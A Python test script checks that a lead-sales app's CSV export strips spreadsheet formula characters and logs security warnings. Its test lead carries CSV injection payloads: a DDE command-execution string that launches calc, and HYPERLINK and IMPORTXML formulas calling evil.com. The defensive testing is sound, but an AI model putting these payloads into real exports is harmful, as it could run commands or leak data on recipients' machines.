#!/usr/bin/env python3
"""
Test script to verify CSV injection logging.

This test creates a lead with malicious data and verifies that:
1. Dangerous characters are stripped from the CSV export
2. Security warnings are logged for monitoring
"""

from __future__ import annotations

import logging
import sys
from io import StringIO
from pathlib import Path
from uuid import uuid4

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from datetime import datetime, timezone
from domain.lead import Lead, LeadClassification
from domain.age_bucket import AgeBucket
from repositories.lead_repository import insert_lead
from repositories.sale_repository import record_sale
from repositories.client_repository import create_test_client, get_client_by_email
from services.csv_export_service import generate_csv_for_sales


# Set up logging to capture warnings
class LogCapture(logging.Handler):
    """Custom handler to capture log records for testing."""
    def __init__(self):
        super().__init__()
        self.records = []

    def emit(self, record):
        self.records.append(record)


def test_csv_injection_logging():
    """
    Test that CSV injection attempts are logged.

    Creates a lead with dangerous characters in multiple fields
    and verifies that each one generates a security warning log.
    """
    print("\n" + "=" * 80)
    print("TEST: CSV Injection Logging")
    print("=" * 80)

    # Set up log capture
    log_capture = LogCapture()
    log_capture.setLevel(logging.WARNING)

    # Get the csv_export_service logger
    csv_logger = logging.getLogger("services.csv_export_service")
    csv_logger.addHandler(log_capture)
    csv_logger.setLevel(logging.WARNING)

    print("\n1. Creating test client...")
    client = get_client_by_email("injection_test@example.com")
    if client is None:
        client = create_test_client("injection_test@example.com", "Injection Test Corp")
        print(f"   Created client: {client.email}")
    else:
        print(f"   Using existing client: {client.email}")

    # Create lead with malicious data in multiple fields
    print("\n2. Creating lead with malicious CSV injection data...")
    malicious_lead = Lead(
        lead_id=uuid4(),
        state="LA",
        classification=LeadClassification.GOLD,
        created_at_utc=datetime.now(timezone.utc),

        # MALICIOUS DATA - Various CSV injection attempts
        full_name="=1+1+cmd|'/c calc'!A1",           # Formula execution attempt
        first_name="@SUM(A1:A10)",                    # Excel formula
        last_name="+HYPERLINK('http://evil.com')",   # Hyperlink formula
        borrower_phone="-5551234567",                # Starts with dash
        address="=IMPORTXML('http://evil.com')",     # Google Sheets formula
        city="Normal City",                           # Clean data (no logging)
        county="@GET.WORKSPACE(1)",                   # Old Excel macro
        lender="	Tab Start Bank",                    # Starts with tab

        # Rest are normal
        mortgage_id="MORT123",
        campaign_id="CAMP456"
    )

    print("   Malicious data inserted:")
    print(f"     full_name: {malicious_lead.full_name}")
    print(f"     first_name: {malicious_lead.first_name}")
    print(f"     last_name: {malicious_lead.last_name}")
    print(f"     borrower_phone: {malicious_lead.borrower_phone}")
    print(f"     address: {malicious_lead.address}")
    print(f"     county: {malicious_lead.county}")

    # Insert lead into database
    insert_lead(malicious_lead)
    print(f"   Lead inserted with ID: {malicious_lead.lead_id}")

    # Create sale for this lead
    print("\n3. Creating sale record...")
    from decimal import Decimal
    sale = record_sale(
        lead_id=malicious_lead.lead_id,
        client_id=client.client_id,
        bucket=AgeBucket.MONTH_6_TO_8,
        sold_at=datetime.now(timezone.utc),
        purchase_price=Decimal("8.00"),
        currency="USD"
    )
    print(f"   Sale created with ID: {sale.sale_id}")

    # Clear any previous log records
    log_capture.records.clear()

    # Generate CSV export (this should trigger logging)
    print("\n4. Generating CSV export (should trigger security warnings)...")
    csv_content = generate_csv_for_sales([sale.sale_id], client.client_id)

    # Check what was logged
    print(f"\n5. Checking security logs...")
    print(f"   Total warnings logged: {len(log_capture.records)}")

    if len(log_capture.records) == 0:
        print("   [FAIL] No warnings were logged!")
        return False

    # Display each warning
    print("\n   Security warnings logged:")
    for i, record in enumerate(log_capture.records, 1):
        field_name = record.__dict__.get('field_name', 'unknown')
        stripped = record.__dict__.get('stripped_characters', '?')
        original = record.__dict__.get('original_value', '')[:50]
        sanitized = record.__dict__.get('sanitized_value', '')[:50]

        print(f"\n   Warning #{i}:")
        print(f"     Field: {field_name}")
        print(f"     Stripped characters: '{stripped}'")
        print(f"     Original value: {original}")
        print(f"     Sanitized value: {sanitized}")

    # Verify CSV is safe
    print("\n6. Verifying CSV is safe...")
    csv_lines = csv_content.split('\n')
    data_lines = [line for line in csv_lines[1:] if line]  # Skip header, remove empty

    dangerous_found = False
    for line in data_lines:
        if line and line[0] in ['=', '+', '@']:
            print(f"   [FAIL] Dangerous character found in CSV: {line[0]}")
            dangerous_found = True

    if not dangerous_found:
        print("   [PASS] CSV is safe - no dangerous characters in output")

    # Summary
    print("\n" + "=" * 80)
    print("RESULTS:")
    print("=" * 80)
    print(f"Warnings logged: {len(log_capture.records)}")
    print(f"CSV is safe: {not dangerous_found}")

    expected_warnings = 6  # We expect warnings for the 6 malicious fields
    if len(log_capture.records) >= expected_warnings and not dangerous_found:
        print("\n[PASS] CSV injection logging is working correctly!")
        print(f"       System detected and logged {len(log_capture.records)} potential injection attempts")
        return True
    else:
        print(f"\n[FAIL] Expected at least {expected_warnings} warnings, got {len(log_capture.records)}")
        return False


def main():
    """Run the test."""
    print("\n" + "*" * 80)
    print("CSV INJECTION LOGGING TEST")
    print("*" * 80)

    try:
        result = test_csv_injection_logging()

        if result:
            print("\nTest passed! CSV injection logging is working.")
            return 0
        else:
            print("\nTest failed!")
            return 1

    except Exception as e:
        print(f"\n\nERROR: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
